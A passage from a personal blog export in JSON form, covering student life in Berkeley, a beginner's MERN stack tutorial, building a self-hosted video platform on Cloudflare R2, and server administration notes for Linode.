weekdays. There are many clubs on campus, but I wan't in the\nmood of application in the first semester since I faced finals at the\nstart of the first semester, so I didn't get into any clubs. It is good\nto be alone anyways.</p>\n<p>Hass Library is always open, even on weekends. But it always gets\nunbearably hot there, even when I took all clothes off. Also once I was\nlocked out after going out to answer a phone call, and my backpack was\nin the library but the door couldn't open somehow. Anyways the door\nopened after 1 hour strangely.</p>\n<h2 id=\"berkeley-high-school\">Berkeley High School</h2>\n<p>I lived right across Berkeley High school in the first 4 months here,\nand I would usually see groups of people going out to have lunch at\nnoon. Anybody can enter the high school, and it seems that the students\nare having fun. I once went inside and stayed for half a day. Students\ngo around between classes, and they usually walk in groups, chatting as\nthey walk. School usually ends at 2 or 3, and students didn't seem cram\nor having to study 15 hours a day or something. Classes are discussion,\nand students sit in strange positions or walk around, but teachers don't\nreally mind. There are many sport events, including soccer, basketball,\nvolleyball, and I usually spectate on weekends or just randomly\nencountering some. Ursula Le Guin went to the high school, who wrote A\nWizard of Earthsea, a book recommended by my English teacher in middle\nschool.</p>\n<h2 id=\"weekends\">Weekends</h2>\n<p>Unlike Shanghai or Hefei, weekend here is also different, since some\nstores are closed and the school is half shut down.</p>\n<p>San Francisco</p>\n<p>Since the Bart is slow, going to San Francisco and back takes quite a\nfew hours. San Francisco is much crowded than Berkeley, and there are\ntall buildings and large shopping malls, and in downtown things are\nclose to each other, just like in People's Square. I went there once to\nwatch a musical. Many people take the Bart in the morning.</p>\n<h2 id=\"renting\">Renting</h2>\n<p>It is extremely expensive to rent a house here, and a single bedroom\nwould cost more than 1500 dollars. I figured that it is about 7 times\nmore expensive than Hefei, where I found a studio only 1700 rmb a month,\nbut here the cheapest studio are like 1700 dollars a month.</p>\n<p>I first rent a bedroom, and the bedroom was small but everything was\nfurnished. Then the lease ended and they said they will only continue if\nI continued to rent for 1 year, so I went on zillow and rent a studio.\nThe studio was unprepared when I moved in, with no bed, no dishes, no\ntable, no chair. So I had to buy a bed frame and buy mattress\nmyself.</p>\n<p>Furthermore, the rent prices are strange, where double or triple\nrooms cost as expensive as 1000 dollars, with the same size shared by 2.\nSo I figured that if 2 people live in a single room it would only be\nlike 800 dollars, or around 550 dollars for 3 people to live in a room.\nI don't understand why they are so strangely curved. Anyways, everything\nis very expensive.</p>\n", "_id": "66689634547d3fe09811874b"}

{"title": "MERN Stack Conclusion", "date": "Thu Jun 23 2023 18:00:04", "type": "web-dev", "body": "<h2 id=\"overview\">Overview</h2>\n<p>Create a web application with frontend and backend and using\nlibraries and functions to connect between them.</p>\n<p>Frontend: Html, CSS, Javascript, Jquery, React, UI (Github Page)\nBackend: Axios, Express, Mongodb(Mongoose), Linux</p>\n<p>It is easy to create a webpage with github pages/google site/wix, but\ngithub page is static and I don't like Wix.</p>\n<h2 id=\"why-i-use-mern-stack\">Why I use Mern Stack</h2>\n<p>Because many online tutorials use mern stack and it is mainly based\non Javascript.</p>\n<h2 id=\"html-css\">Html, CSS</h2>\n<p>It is kind of like writing in Microsoft Word with Html and CSS,\nanyways, just add bunch of tags and styles and you can get a good web\npage design. As a minimalist, I am not a big fan of designing\nanyways.</p>\n<h2 id=\"jquery\">Jquery</h2>\n<p>Html and CSS for javascript is kind of like EasyX in C Language or\nTkinter in Python, which you can use to create better applications.</p>\n<p>Javascript makes the webpage alive. For example, you can change\nclasses with Javascript with</p>\n<pre class=\"js\"><code>document.getElementsById(&quot;&lt;someid&gt;&quot;).innerHTML=&quot;&lt;somehtml&gt;&quot;</code></pre>\n<p>Or add a function after button clicking by specifying\n<code>&lt;button onclick=\"somefunction()\"/&gt;</code></p>\n<p>Also you can add event listener(clicking or keyboard or hand\nmovement), alerts, set interval for functions, for example like <a\nhref=\"https://mygame4214.github.io/2048/2048.html\">this page</a></p>\n<p>You can also add forms and input, and dynamically change the input.\nAlso Javascript can modify cookies, and adjust site settings according\nto the cookies.</p>\n<h2 id=\"react\">React</h2>\n<p>React is Javascript Library.</p>\n<p>By using the components, and you can define a kind of component and\nuse it again and again, like customized Button</p>\n<p>Start React by typing\n<code>npx create-my-app &lt;appname&gt;</code></p>\n<p>then naviagate to index.js and change it.</p>\n<p>By running npm start, you can see the website on localhost:3000</p>\n<p>Also, I didn't use the app.js file, and I deleted all the logos and\nnot useful stuffs.</p>\n<h3 id=\"routing\">Routing</h3>\n<p>First code the elements you want on a separate js file, and they\nshould return HTML files. For example, , then render it on a path.\n(Maybe you want to render about-me on \"/aboutme\")</p>\n<pre class=\"js\"><code>root.render(\n  &lt;HashRouter&gt;\n    &lt;NavBar /&gt;\n    &lt;Routes&gt;\n      &lt;Route path=&quot;&lt;somepath1&gt;&quot; element={&lt;someelement&gt; /&gt;} /&gt;\n      {path}\n    &lt;/Routes&gt;\n    &lt;Footer /&gt;\n  &lt;/HashRouter&gt;\n)</code></pre>\n<p>Use BrowseRouter or HashRouter (not much difference between the two\nfor me except HashRouter has /#/ on the URL), to construct all path of\nthe website. For example, if there is 3 subpages on a website(aboutme,\ncontact, blog), then code like:</p>\n<pre class=\"js\"><code>&lt;Route path=&quot;/aboutme&quot; element={&lt;AboutMe /&gt;} /&gt;\n&lt;Route path=&quot;/contact&quot; element={&lt;Contact /&gt;} /&gt;\n&lt;Route path=&quot;/blog/&quot; element={&lt;Blog /&gt;} /&gt;</code></pre>\n<h3 id=\"dynamic-routing\">Dynamic Routing</h3>\n<p>You can also build pages (like a blog), where the page may change and\nbe added, build it like</p>\n<pre class=\"js\"><code>// For Loop\narr[i] = (\n          &lt;Route\n            path={date[i]}\n            element={BlogUtil(title[i], text[i], date[i])}\n          /&gt;)</code></pre>\n<p>Then basically add the array with {} in the middle of routes</p>\n<h2 id=\"components-and-props\">Components and Props</h2>\n<p>Build a personal component by adding props in the function, for\nexample, building a button function</p>\n<pre class=\"js\"><code>const Button = (props) =&gt; {\n  return (\n    &lt;div&gt;\n      &lt;p&gt;{props.title}&lt;/p&gt;\n      &lt;button&gt;{props.text}&lt;/button&gt;\n    &lt;/div&gt;\n  );\n};</code></pre>\n<p>then export then Button. This reduce many lines of duplicate code.\nYou can then add the personalized button with title and text\n<code>&lt;Button text=\"\" title=\"\" /&gt;</code></p>\n<h2 id=\"ui\">UI</h2>\n<p>Of course coding everything is too much, and there are lots of UI\nlibraries, like React-Bootstrap. Install the library from npm, then you\ncan use the components by changing it a little bit.</p>\n<p>For example, a navbar in React-Bootstrap</p>\n<pre class=\"js\"><code>&lt;Navbar className=&quot;bg-body-tertiary&quot;&gt;\n  &lt;Container&gt;\n    &lt;Navbar.Brand href=&quot;#home&quot;&gt;React-Bootstrap&lt;/Navbar.Brand&gt;\n    &lt;Navbar.Toggle aria-controls=&quot;basic-navbar-nav&quot; /&gt;\n    &lt;Navbar.Collapse id=&quot;basic-navbar-nav&quot;&gt;\n      &lt;Nav className=&quot;me-auto&quot;&gt;\n        &lt;Nav.Link href=&quot;#home&quot;&gt;Home&lt;/Nav.Link&gt;\n        &lt;Nav.Link href=&quot;#link&quot;&gt;Link&lt;/Nav.Link&gt;\n      &lt;/Nav&gt;\n    &lt;/Navbar.Collapse&gt;\n  &lt;/Container&gt;\n&lt;/Navbar&gt;</code></pre>\n<p>Then return the navbar and export to index js. There are also many\nother components in React-Bootstrap like Button or Breadcrumbs. The main\nreason I use the libraries are I don't want to code css.</p>\n<h2 id=\"axios\">Axios</h2>\n<p>Use axios to communicate with the backend.</p>\n<p>For example</p>\n<pre class=\"js\"><code>var x\naxios.get(&quot;https://ipapi.co/json&quot;).then(res=&gt;{x=res.data})</code></pre>\n<p>This is a sample code of get request. Also, since the request is\nJSON, it is useful to JSON.stringify the request, or refer to it by\nindex. I am only interested in getting the data from the server. There\nmay be lots of error in the get request, so it is best to add\n<code>.catch(error=&gt;{console.log(error)}</code></p>\n<p>A Post request looks like</p>\n<pre class=\"js\"><code>axios.post(&quot;https://localhost:5000&quot;, {\n    item1: value1\n    item2: value2\n//more items\n});</code></pre>\n<p>This is used to make a post request, which will later put data into\ndatabase.</p>\n<p>So after launching the backend you can use the axios to communicate\nwith the other port on localhost.</p>\n<p>As you can see, it is much easier with the constructed tags than to\nbuild one on my own, and also you can change by specifying style css,\nthen exporting it.</p>\n<p>Basically create a header, a footer, render the pages with header and\nfooter separately(so you can see it on every page), then on every page\neither it is static html, or you can perform get requests on other\nwebsites(backend localhost) and add it on the page.</p>\n<h2 id=\"mongodb\">Mongodb</h2>\n<p>Why need the backend? Because like in a social media page there is\nconstantly changing data. I personlly don't think you need a backend for\na personal homepage, but anyways, I just want to see how it works.</p>\n<p>I used Mongodb in the application, and by signing up on mongodb and\nclicking connect, and it will create default database</p>\n<pre class=\"js\"><code>const uri = &quot;mongodb+srv://&lt;username&gt;:&lt;password&gt;@cluster0.h0cn5vv.mongodb.net/?retryWrites=true&amp;w=majority&quot;;</code></pre>\n<p>add a uri in the code and connect it by replacing the username and\npassword.</p>\n<h3 id=\"mongoose\">Mongoose</h3>\n<p>Mongoose is the javascript library to interact with Mongodb server\nfrom the code.</p>\n<h3 id=\"schema\">Schema</h3>\n<p>The first thing is to define schemas. For example</p>\n<pre class=\"js\"><code>const someSchema = new Schema(\n  {\n    username: {\n      type: String,\n      default: &quot;&quot;,\n    }\n    password: {\n      type: String,\n      default: &quot;&quot;,\n    }\n\n  }\n);</code></pre>\n<p>defines a user, then make a mongoose Model, and then you can export\nthe file to the main node file.</p>\n<h2 id=\"express\">Express</h2>\n<p>Use express to interact between visiting the webpage and the\ndatabase.</p>\n<pre class=\"js\"><code>router.route(&quot;/post&quot;).post((req, res) =&gt; {}</code></pre>\n<p>defines a post method, then we create a new schema and add to the\nserver</p>\n<p>In Get requests we can use find() or sort() methods</p>\n<p>You can store the data as JSON and send to the database, and also\nview and change the database by logging in mongodb and browse\ncollections.</p>\n<p>Use axios to interact with the backend and mongoose to connect the\nbackend with the database, and then the site is live.</p>\n<h3 id=\"postman-apis\">Postman APIs</h3>\n<p>Download a post API to test the code to debug. By sending a get\nrequest or post request to the url, then checking the database.</p>\n<h2 id=\"site-is-live\">Site is live</h2>\n<p>After adding cors to the code you can easily create a web application\nwith frontend and backend on different ports in the localhost.</p>\n<p>At this point you should be able to access the website on the network\nby typing in the computer ip address and the ports.</p>\n<p>For example, if it is hosted on localhost:3000, then go to :3000 to\nsee the website</p>\n<h2 id=\"deploy-to-linux\">Deploy to Linux</h2>\n<p>However, you can't run everything on your own computer because it\ndepends on Internet connection and your computer may shut off, so by\nbuying a Linux on the cloud and runnning the server on the cloud server,\nyou can then deploy the web application.</p>\n<p>This seems easy, but it is the most time-consuming thing of all, and\ntook me many hours in sleepless nights to finish.</p>\n<p>Buy a server in Linode(or AWS or whatever), then ssh into the server\nwith shell, then install the node and npm, then git clone the\nrepository, then run it.</p>\n<p>There are several problems:</p>\n<p>1 The sudo default installed node is v12, which is really old, and\nsome applications require more than v12</p>\n<p>2 There may be bugs in the environment, and debugging is hard with\ncommand line</p>\n<p>Basically, I just couldn't run the nodejs in the cloud server, and as\na noob I want to have a GUI in the cloud server, which makes it look\nbetter than the command line.</p>\n<p>But GUI is very hard to install, and although in my own computer I\ninstalled lightdm and ubuntu-desktop easily. When I tried to install\nxfce, there are some driver problems.</p>\n<p>Then I tried tigervnc-standalone-server, and tried connecting using\nRemmina and VNC viewer, and it always refuse to connect. But when\nconnecting with\n<code>ssh -L 5901:127.0.0.1:5901 user@example.com</code></p>\n<p>it works.</p>\n<p>Then I finally managed to add a vnc hostname and connect to the\nserver with VNC viewer by adding another Linode, and then there was no\nbrowser.</p>\n<p>Then I installed firefox with snap but keyboard doesn't work in\nfirefox (I don't know why), then I tried to install google-chrome but it\nwouldn't open(because I need to change the xhost display settings with\nroot and then open it as user), then I installed Palemoon and it worked\nfine. I tried to install node v18 and it failed, and then I installed\nnode v20 and it succeeded.</p>\n<p>Then I deployed the code to <a href=\"http://45.79.98.144:3000\">the\nserver</a>, but it wouldn't connect when I used the chrome vpn extension\nto connect to China(firewall), although it works fine when connecting to\nother countries like Russia and Netherlands.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>There are many things to learn in Web Application, but most of them\nare very simple. I spend many days debugging because of lack of\nexperience and hope to code better in the future.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://www.w3schools.com/css/\">CSS</a></li>\n<li><a href=\"https://www.w3schools.com/js/\">JavaScript Tutorial</a></li>\n<li><a href=\"https://www.w3schools.com/jquery/\">jQuery</a></li>\n<li><a href=\"https://reactjs.org/docs/getting-started.html\">React\nDocumentation</a></li>\n<li><a href=\"https://reactrouter.com/web/guides/quick-start\">React\nRouter Documentation</a></li>\n<li><a\nhref=\"https://react-bootstrap.netlify.app/\">React-Bootstrap</a></li>\n<li><a href=\"https://axios-http.com/docs/intro\">Axios\nDocumentation</a></li>\n<li><a href=\"https://expressjs.com/en/guide/routing.html\">Express.js\nGuide</a></li>\n<li><a href=\"https://www.mongodb.com/docs/\">MongoDB\nDocumentation</a></li>\n<li><a href=\"https://mongoosejs.com/docs/guide.html\">Mongoose\nDocumentation</a></li>\n<li><a\nhref=\"https://www.youtube.com/watch?v=SccSCuHhOw0&amp;ab_channel=WebDevSimplified\">Express\nTutorial (Web-dev Simplified)</a></li>\n<li><a\nhref=\"https://www.youtube.com/watch?v=7CqJlxBYj-M&amp;t=4373s&amp;ab_channel=freeCodeCamp.org\">MERN\nStack Tutorial (freeCodeCamp)</a></li>\n<li><a href=\"https://fullstackdecal.com/docs/Lessons/Lesson3\">Decal\nWebsite</a></li>\n<li><a href=\"https://www.cubstart.com/#/schedule\">Another Decal\nWebsite</a></li>\n<li><a href=\"https://www.youtube.com/@webdevatberkeley7546\">Decal\nVideos</a></li>\n<li><a\nhref=\"https://www.youtube.com/watch?v=oHAQ3TzUTro&amp;ab_channel=SamMeech-Ward\">Deploy\nto Linux YouTube Video</a></li>\n<li><a\nhref=\"https://www.linode.com/docs/guides/install-vnc-on-ubuntu-20-04/\">Remote\nDesktop GUI</a></li>\n<li><a href=\"https://stackoverflow.com\">Stack Overflow</a></li>\n</ul>\n", "_id": "66689634547d3fe098118751"}
{"title": "Coding a Full Stack Video Platform", "date": "Mon Mar 18 2024 07:36:43", "type": "web-dev", "body": "<p>Recently, the idea of self-hosting was so intriguing that I decided\nto code a full-stack video platform.</p>\n<h2 id=\"cloud-object-storage-selection\">Cloud Object Storage\nSelection</h2>\n<p>There are many Object Storage providers, including Amazon AWS,\nAkamai, Digital Ocean, Cloudflare, Alibaba Cloud. Nearly all of them are\ncompatible with AWS S3 storage. I previously tried to self-host\nNextcloud and File Storage with s3fs, but they are pretty slow on the\nfrontends, capping at about less than 1 MB/s, in fact, too slow for the\nstorage to be utilized.</p>\n<p>Choosing either is fine, but I chose Cloudflare because Cloudflare R2\nis very fast and efficient, and I am already using Cloudflare services.\nIt is slightly more expensive than Dropbox, but self-hosting is so much\nfun and controllable than using a proprietary service. Dropbox is\ngenerally good enough to use, except for a few occasions when the\nDropbox frontend UI dies.</p>\n<p>Cloudflare is good because it is really cheap and offers many other\nservices, like a proxy for servers to prevent against DDOS, and it is\nalso a domain registrar. Cloudflare has everything except VPS for web\nhosting.</p>\n<p>I tried contacting Alibaba and got a response, unfortunately, I use\nneither of those apps(just deleted Telegram). Alicloud is probably the\ncheapest for 1 PB storage, at 132120 dollars a year(while Cloudflare is\n15 dollars/month for 1 TB and Amazon is around 22 dollars/month for 1 TB\nexcept for its glacier archives). Dropbox has like 10 dollar/month for 2\nTB, but I reckon if people actually utilized their Dropbox storage the\ncompany will go bankrupt. that if I want to start a business (if in\nChina) it can be a viable choice.</p>\n<p><img src=\"https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-03-18%2008-42-39.png\"/></p>\n<h2 id=\"designing-the-backend\">Designing the Backend</h2>\n<p>After that, I init the PostgreSQL and added some user and video\nschemas.</p>\n<p>I started coding with raw metal with Golang, and then I was busy for\nlike a week, then I accidentally threw away the draft, so I started over\nagain. It\u2019s not like I coded a lot anyway.</p>\n<p>Mainly because Invidious uses S3. Using Node.js is totally feasible,\nI just wanted something new to try for fun.</p>\n<p>I didn\u2019t know Ruby language before, but Crystal is still very easy to\npick up, and it claims to be lightning quick (as quick as C\nlanguage).</p>\n<p>Designing the backend is pretty easy, as I aim for a small-scale\nproject. Just sync everything before uploading to Object Storage, add\nthem to the local database. Then retrieve everything from the local\ndatabase.</p>\n<p>The current backend looks like this</p>\n<pre class=\"sh\"><code>\u251c\u2500\u2500 config.yml\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 shard.lock\n\u251c\u2500\u2500 shard.yml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 backend.cr\n    \u251c\u2500\u2500 config.cr\n    \u251c\u2500\u2500 controllers\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 auth_controller.cr\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 storage_controller.cr\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 user_controller.cr\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 video_controller.cr\n    \u251c\u2500\u2500 extensions\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 context_extension.cr\n    \u251c\u2500\u2500 middlewares\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 auth_middleware.cr\n    \u251c\u2500\u2500 routes.cr\n    \u2514\u2500\u2500 storage\n        \u251c\u2500\u2500 check_existence.cr\n        \u251c\u2500\u2500 delete_file.cr\n        \u251c\u2500\u2500 generate_upload_url.cr\n        \u251c\u2500\u2500 list_files.cr\n        \u2514\u2500\u2500 upload_url.cr</code></pre>\n<p>Mainly shards is a dependency tool, and add a middleware to help the\nauthorization by signing a private key in <code>config.yml</code>, and\nroutes look like this (kind of like node.js)</p>\n<pre class=\"crystal\"><code>get &quot;/api/user/:id&quot;, &amp;-&gt;UserController.get_user(HTTP::Server::Context)\npost &quot;/api/auth/signup&quot;, &amp;-&gt;AuthController.sign_up_user(HTTP::Server::Context)</code></pre>\n<p>The syntax isn\u2019t hard, not that hard to learn from a Node.js\nbackground, and ChatGPT knows pretty much of it. Mainly the backend is\nfor interacting with the PostgreSql.</p>\n<h2 id=\"trying-to-generate-the-signature-myself\">Trying to Generate the\nSignature Myself</h2>\n<p>There is this s3 library for Crystal\nhttps://github.com/taylorfinnell/awscr-s3, when I tried to generate a\npresigned url for the user to upload videos. I don\u2019t want the user to\nupload to the server, instead, I want it to upload directly to the\ncloud. But the built-in method always generates incorrectly, and there\nwasn\u2019t anything I could do. I tried coding a generation myself with\nChatGPT, but it didn\u2019t generate correctly either, repeatedly returning\nthe Signature didn\u2019t match.</p>\n<p>So basically they MAC the date and time with the access secret key\nfor s3, and it was pretty nitty-gritty detailed like whatever thing they\nneed. The boto in python and node.js has built-in generation\nmethods.</p>\n<p>I searched another repo https://github.com/iksteen/aws-request-signer\nand it did generate a key, but the key wasn\u2019t working either, probably\nbecause it was pretty old and Amazon had like another key signing\nmethod.</p>\n<p>Mainly because my endpoint is Cloudflare while most of the key\ngeneration have endpoints to s3 amazonnews, but I thought like they\nshould both work.</p>\n<p>I spent a whole dawn and morning trying to do this and failed, so I\ngave up and used boto embedded in crystal since crystal can execute\nBash.</p>\n<p>Still, the presigned url has a limitation of like 5 GB.</p>\n<h2 id=\"designing-the-frontend-react\">Designing the Frontend React</h2>\n<p>Since this project is still in Alpha, I just fetched everything from\nthe backend. Since there aren\u2019t much in the backend, and there isn\u2019t\ntraffic, processing everything in frontend code seems\nstraightforward.</p>\n<p>I jumped from Claude Opus to ChatGPT, and the frontend got good\nenough very quickly. The frontend just includes signup, login, upload,\nand viewing videos right now, although I plan to add extensive features.\nThe backend isn\u2019t mature enough right now</p>\n<p>Overall I spent a little over 2 full days of the weekend at home\nbuilding the crap. It seems good enough for a raw implementation for a\nfrontend, though, and I deployed it to <a\nhref=\"https://anony.tube/\">anony.tube</a> and <a\nhref=\"https://anonytube.jimchen.me/\">anonytube.jimchen.me</a>.</p>\n<p>Cloudflare offers good speed, generally, and there wasn\u2019t much\nproblem with uploading and downloading videos, since I am directly\ncommunicating with Cloudflare.</p>\n<p>Then it\u2019s like managing Cors and https, and that is really tiresome,\nlike some requests just won\u2019t work in the server\u2019s frontend. Anyways\nlike after trying I pretty much enabled all Cors, which isn\u2019t good for\nsecurity but anyways good enough for like normal usage.</p>\n<p>I added the token in cookies for expiration over 7 days. I checks if\nthe user have the correct token in cookie on entering the webpage, if\nthey do, they are automatically logged in. Also they are redirected from\nsignin to the webpage if they have credentials.</p>\n<h2 id=\"more-features-to-add\">More Features to Add</h2>\n<p>First, I am adding an NSFW detector, since I am aiming for legal\nhosting. I am also aiming for like no copyright contents or DMCA. I am\nalso hoping to add different resolutions for videos. Anyways, I am\npretty tired for now.</p>\n<h2 id=\"cost\">Cost</h2>\n<p>It\u2019s actually surprisingly cheap for a small video platform, as the\nserver cost 5 dollars a month for Linode Nanode, and like storage costs\n15 dollars a month for 1 TB, which I probably won\u2019t need for now.\nCloudflare does most of the job for me.</p>\n<h2 id=\"about-public-video-platforms\">About Public Video Platforms</h2>\n<p>Many video platforms have awfully problematic features and I don\u2019t\nreally like them. They try every method possible to stop downloading,\nonly resulting in slower speeds. I also hate the login(and especially\nhate the fraudulent poping up of forcing me to login). Anyways, these\nplatforms have to comply with local laws, so it\u2019s more understandable to\nhave control. But I am aiming for liberty (also within laws) for my\nplatform, mainly hoping to enhance the experience of a guest user. I\nthink another reason might be that they wrote large junky code 10 years\nago which are too trash to debug or fix.</p>\n<p>There are lots of existing platforms like Peertube and YouPHPTube,\nbut I just want to design one myself for the fun sake of it.</p>\n<p>But the problem is probably no one will visit this website, so in the\nend, it will probably end up like a Dropbox for my personal use. Many\npeople probably like those video platforms anyways, since a determined\nperson who hate those video platforms probably sought for self-host\noptions like me, and I do not consider myself technically advanced or\nsomething. So don\u2019t believe it when people are complaining, because\nchances are they actually don\u2019t mean it:).</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://docs.aws.amazon.com/s3/index.html\">Amazon AWS S3\nDocumentation</a></li>\n<li><a href=\"https://developers.cloudflare.com/r2/\">Cloudflare R2\nDocumentation</a></li>\n<li><a\nhref=\"https://docs.digitalocean.com/products/spaces/\">DigitalOcean\nSpaces Documentation</a></li>\n<li><a\nhref=\"https://www.alibabacloud.com/help/doc-detail/31827.htm\">Alibaba\nCloud Object Storage Service (OSS) Documentation</a></li>\n<li><a href=\"https://www.postgresql.org/docs/\">PostgreSQL\nDocumentation</a></li>\n<li><a href=\"https://golang.org/doc/\">Golang Documentation</a></li>\n<li><a href=\"https://crystal-lang.org/reference/\">Crystal Language\nDocumentation</a></li>\n<li><a href=\"https://github.com/iv-org/invidious\">Invidious\nProject</a></li>\n<li><a\nhref=\"https://boto3.amazonaws.com/v1/documentation/api/latest/index.html\">Boto3\nDocumentation</a></li>\n<li><a href=\"https://reactjs.org/docs/getting-started.html\">React\nDocumentation</a></li>\n<li><a href=\"https://www.linode.com/products/\">Linode Nanode</a></li>\n<li><a href=\"https://docs.joinpeertube.org/\">Peertube\nDocumentation</a></li>\n<li><a href=\"https://youphptube.com/\">YouPHPTube Documentation</a></li>\n</ul>\n", "_id": "66689634547d3fe098118752"}
{"title": "Misconceptions and Observations from Working with Linode and Mern Stack", "date": "Thu Mar 28 2024 11:10:24", "type": "web-dev", "body": "<h2 id=\"development-vs-production\">Development vs Production</h2>\n<p>For example, in React, use <code>sudo npm start</code> to start the\nweb server, but actually running in production compiles the code into\nstatic HTMLs in a build directory.</p>\n<h2 id=\"use-of-nginx\">Use of Nginx</h2>\n<p>Using Nginx effectively sets up a reverse proxy, so there is no need\nfor separate machines for different addresses. There is no need for\nseparate frontend and backend Linodes, just set up a reverse proxy to\nproxy to the backend from a specific route.</p>\n<h2 id=\"systemctl-jobs\">Systemctl Jobs</h2>\n<p>Actually, setting up nginx.conf to point to the frontend build\ndirectory effectively starts the website, so there is no need for a\nsystemctl job to keep running <code>npm start</code> or whatever.</p>\n<h2 id=\"object-storage-s3-vs-volumes\">Object Storage (S3) vs\nVolumes</h2>\n<p>S3 storage is popular for large file storing (e.g., video hosting),\nwhile volumes are SSDs along with the operating system. Space on the\noperating system is expensive, costing about 0.1 dollar a month for 1\nGB. While object storage like Cloudflare R2 is $0.015 / GB-month. So,\nit\u2019s more scalable to host media in Object Storage than locally, while\nObject Storage might be slower to access, utilizing a built-in CDN\nsolves the problem.</p>\n<h2 id=\"saas\">SaaS</h2>\n<p>Some popular SaaS services include MongoDB.</p>\n<p>MongoDB Official website bans Russian IPs, claiming to support\nUkraine. There are also other MongoDB providers like Digital Ocean.\nThere is even service for MongoDB in Yandex, though.</p>\n<p>Anyways, MongoDB is open source and can be run locally. The official\nwebsite only provides a more stable and scalable option, and just\nsetting up MongoDB from yay and connecting to it in Node.js is\nstraightforward.</p>\n<h2 id=\"some-preferences\">Some Preferences</h2>\n<p>No GUI, GUI messes things up.</p>\n<p>Set up server and run programs myself. First, it is akin to my local\nArch Linux environment, and shouldn\u2019t be that hard. Secondly, using\nthird-party tools messes things up, and third-party GUI tools so-called\npanels are especially confusing and misleading, making it impossible to\ndebug and control.</p>\n<p>Less payment, since excessive paying is useless.</p>\n<p>Fewer external tools/platforms. These mess things up. Especially\nproprietary and commercial companies. Google transferred its domain\nnames to Squarespace, which is weird. So, I transferred all domains to\nCloudflare.</p>\n<h2 id=\"mongodb-security\">MongoDB Security</h2>\n<p>Never leave MongoDB exposed! It will get hacked. Never change the\naccess IP to 0.0.0.0 without configuring a password. Data will be\ndeleted, with only a Bitcoin address left for recovery (which\ndisappeared in 12 hours). More like, don\u2019t store anything valuable in\nthe MongoDB database, and hash (or encrypt) everything sensitive.</p>\n<h2 id=\"ssh-security\">SSH Security</h2>\n<p>Similarly, use strong passwords for SSH.</p>\n<h2 id=\"dbaas-latency\">DbaaS Latency</h2>\n<p>DbaaS (Database as a Service) tends to have higher latency, but\nMongoDB Atlas generally works fine. It reduces the time to maintain the\ndatabase, and offers backups.(though I can manually backup the\ndatabase)</p>\n<h2 id=\"cloudflare-ai-worker\">Cloudflare AI Worker</h2>\n<p>For utilizing Cloudflare AI worker, the Llama model seems really\ngood, quick, and cheap, but the OpenAI Whisper isn\u2019t working, keeps\nsaying upstream service error.</p>\n<h2 id=\"increasing-temporary-space-for-pytorch\">Increasing Temporary\nSpace for PyTorch</h2>\n<p>For installing PyTorch on CPUs, I need to increase tmp space using\n<code>sudo nano /etc/systemd/system/tmp.mount</code>.</p>\n<pre class=\"systemd\"><code>[Unit]\nDescription=Temporary Directory\nAfter=local-fs.target\n[Mount]\nWhat=tmpfs\nWhere=/tmp\nType=tmpfs\nOptions=mode=1777,size=8G\n[Install]\nWantedBy=multi-user.target</code></pre>\n<p>Then</p>\n<pre class=\"sh\"><code>sudo systemctl daemon-reload\nsudo systemctl enable tmp.mount\nsudo reboot</code></pre>\n<p>Increase the tmp space.</p>\n<h2 id=\"python-script-killed\">Python Script Killed</h2>\n<p>Use <code>dmesg</code> to find the problem.</p>\n<p>If it\u2019s running out of memory: include the Swap space in Linode. Not\na good solution, but enough for scripts running 24/7.</p>\n<p>Use separate Linodes for managing the worker and the server, because\nmerging the two might cause the server to become not responsive (could\nbe managed with <code>cpulimit</code> but takes lots of time).</p>\n<h2 id=\"temp-files-in-python\">Temp Files in Python</h2>\n<pre class=\"py\"><code>temp_dir = tempfile.mkdtemp(dir=os.getcwd())</code></pre>\n<p>then use shutil to remove it.</p>\n<h2 id=\"video-upscaling\">Video Upscaling</h2>\n<p>Too expensive to run; outdated projects throw an error: No module\nnamed \u2018torchvision.transforms.functional_tensor\u2019, and waifu2x upgrading\nis not that good. It\u2019s slightly better than original, but far from\nnative 4k videos (blurry in previously clear parts like black and white\nstripes). Using <code>lanczos</code> is far less good .</p>\n<p>Face upgrading seems ok, but it only offers face enhancement. More\nakin to Web Glow.</p>\n<h2 id=\"environment-problems\">Environment Problems</h2>\n<p>Use a <code>builduser</code> and <code>yay</code>, you can remove the\npassword (set <code>emptypasswordssh</code> to no). Then use that user\nto install things with <code>yay</code>, and for Python libraries:\neither install with <code>yay</code> (sometimes takes a long time\ncompiling) or simply use <code>venv</code>.</p>\n<p>I like Arch Linux because it\u2019s DIY, and any problems comes from the\nuser. Ubuntu packages need to be compiled/downloaded at an up-to-date\nversion to work.</p>\n<h2 id=\"claude-vs-gpt\">Claude vs GPT</h2>\n<p>GPT seems to be getting nerfed and becomes lazy with coding. Claude\nopus/sonnet much better.</p>\n<h2 id=\"nginx\">Nginx</h2>\n<p>Increase <code>maxhashsize</code> to 4096, and give permissions (or\nuse a specific user, in my case <code>builduser</code>), or else\nvisiting the webpage will result in a 500 error. Arch Linux doesn\u2019t have\n<code>nginx</code> nor <code>www-data</code> user by default.</p>\n<h2 id=\"translation-tools\">Translation Tools</h2>\n<p>There are many translation tools available, including Google-t5,\nFacebook\u2019s NLLB Distilled, Helsinki NLP, etc. Just download the model\nfrom Hugging Face, then use Transformers, and it runs pretty smoothly\nwhen translating VTT files. But it still takes a really long time. Then\nthere\u2019s Argos Translate and CTranslate built on OpenNMT models.</p>\n<h2 id=\"speed-comparison\">Speed Comparison</h2>\n<p>Laptops are by far much worse in terms of CPU performance compared\nwith cloud servers. My laptop, though high-end, takes about the same\ntime to process a video as an 8 GB Linode with 4 CPUs (it\u2019s not\nutilizing all 16 CPUs on my laptop, but you get the idea). Cloud servers\nalso offer much faster internet speed.</p>\n<h2 id=\"running-costs\">Running Costs</h2>\n<p>Running a GPU constantly is way too expensive for me; the prices\nrange from 0.2-5 dollars an hour. Even a single-core, very low-end 0.2\ndollar/hour GPU, typically RTX 3000 or 4000 series, costs like 150\ndollars a month. I kind of understand why these websites 